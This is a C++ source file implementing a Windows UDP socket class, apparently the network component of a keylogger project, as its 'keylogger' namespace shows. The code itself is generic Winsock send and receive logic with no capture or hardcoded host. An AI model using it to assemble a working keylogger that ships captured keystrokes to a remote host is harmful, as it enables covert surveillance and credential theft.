#include <cstring>
#include <memory>
#include <stdexcept>
#include <string>

#include "io/udp/udp_socket.h"

namespace keylogger {

/* https://stackoverflow.com/questions/1387064/how-to-get-the-error-message-from-the-error-code-returned-by-getlasterror
 */
static [[nodiscard]] std::string GetLastErrorAsString() {
  DWORD error_msg_id = ::GetLastError();
  if (error_msg_id == 0) {
    return "";
  }

  LPSTR msg_buffer = nullptr;
  size_t size = ::FormatMessageA(
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
          FORMAT_MESSAGE_IGNORE_INSERTS,
      nullptr, error_msg_id, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
      reinterpret_cast<LPSTR>(&msg_buffer), 0, nullptr);

  std::string message(msg_buffer, size);
  ::LocalFree(msg_buffer);

  return message;
}

void UdpSocket::SetupSender(const std::string& addr, int port) {
  if (!IsValidIpv4Address(addr)) {
    throw std::invalid_argument("invalid IP addr -> " + addr);
  }

  if (port <= 0) {
    throw std::invalid_argument("port must be a positive integer");
  }

  /* File descriptor initalization. */
  sock_info_.port = port;
  sock_info_.fd = ::socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sock_info_.fd == INVALID_SOCKET) {
    throw std::runtime_error(GetLastErrorAsString());
  }

  /* Initialize the remote target's sockaddr_in info. */
  sock_info_.remote.sin_family = AF_INET;
  sock_info_.remote.sin_port = ::htons(static_cast<uint16_t>(port));
  int status = ::inet_pton(AF_INET, addr.c_str(), &sock_info_.remote.sin_addr);
  if (!status) {
    throw std::runtime_error(GetLastErrorAsString());
  }

  /* Initialize the local machine's sockaddr_in info. */
  sock_info_.local.sin_family = AF_INET;
  sock_info_.local.sin_port = ::htons(0);
  sock_info_.local.sin_addr.s_addr = ::htonl(INADDR_ANY);
}

void UdpSocket::SetupReceiver(int port) {
  if (port <= 0) {
    throw std::invalid_argument("port must be a positive integer");
  }

  /* File descriptor initalization. */
  sock_info_.port = port;
  sock_info_.fd = ::socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sock_info_.fd == INVALID_SOCKET) {
    throw std::runtime_error(GetLastErrorAsString());
  }

  /* Initialize the local machine's sockaddr_in info. */
  sock_info_.local.sin_family = AF_INET;
  sock_info_.local.sin_port = ::htons(static_cast<uint16_t>(port));
  sock_info_.local.sin_addr.s_addr = ::htonl(INADDR_ANY);

  /* Bind us to listen for incoming datagrams. */
  int status =
      ::bind(sock_info_.fd, reinterpret_cast<::sockaddr*>(&sock_info_.local),
             sizeof(sock_info_.local));
  if (status == SOCKET_ERROR) {
    throw std::runtime_error(GetLastErrorAsString());
  }
}

bool UdpSocket::IsValidIpv4Address(const std::string& addr) const {
  ::sockaddr_in sa;
  return (0 != ::inet_pton(AF_INET, addr.c_str(), &(sa.sin_addr)));
}

UdpSocket::UdpSocket(const std::string& addr, int port) {
  WSADATA wsaData;
  int status = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (status != NO_ERROR) {
    throw std::runtime_error(GetLastErrorAsString());
  }
  SetupSender(addr, port);
}

UdpSocket::UdpSocket(int port) {
  WSADATA wsaData;
  int status = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (status != NO_ERROR) {
    throw std::runtime_error(GetLastErrorAsString());
  }
  SetupReceiver(port);
}

UdpSocket::~UdpSocket() {
  if (sock_info_.fd) {
    ::closesocket(sock_info_.fd);
  }
  WSACleanup();
}

int UdpSocket::Send(void* buf, size_t len) {
  int bytes_sent = ::sendto(sock_info_.fd, (const char*)buf, len, 0,
                            reinterpret_cast<::sockaddr*>(&sock_info_.remote),
                            sizeof(sock_info_.remote));
  if (bytes_sent == SOCKET_ERROR) {
    throw std::runtime_error(GetLastErrorAsString());
  }
  return bytes_sent;
}

int UdpSocket::Recv(void* buf, size_t len) {
  int bytes_recved =
      ::recv(sock_info_.fd, reinterpret_cast<char*>(buf), len, 0);
  if (bytes_recved == SOCKET_ERROR) {
    throw std::runtime_error(GetLastErrorAsString());
  }
  return bytes_recved;
}

}  // namespace keylogger
